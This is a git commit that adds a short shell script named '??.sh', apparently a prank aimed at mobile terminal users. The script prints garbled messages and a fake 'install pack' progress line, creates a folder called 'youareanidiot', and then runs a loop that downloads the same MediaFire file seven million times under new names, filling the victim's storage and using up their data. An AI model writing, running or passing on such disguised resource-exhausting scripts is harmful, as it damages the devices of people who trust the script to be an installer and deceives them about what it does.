b2bf3c338c370ad93fecbbe5230bbbf4e006a488
Camtuong153 <cammanhtuong@gmail.com>
2026-04-23 15:45:58 +0700

    Not install file
    pkg install curl

---
+++ ??.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+echo -e "\e[1;37m not OPEN file!!!\e[0m"
+echo -e "\e[1;37m you not press..[0m"
+echo -e "\e[1;37m hello!!\e[0m"
+for i in {1..10}; do echo -ne "\e[1;37m1. install [${i}] pack\r[0m"; done
+mkdir youareanidiot
+cd youareanidiot
+for i in {1..7000000}; do curl  -s -o idiot_$i 'https://www.mediafire.com/file/8u3ptcr0riczx0k/00n0.txt/file' ; done
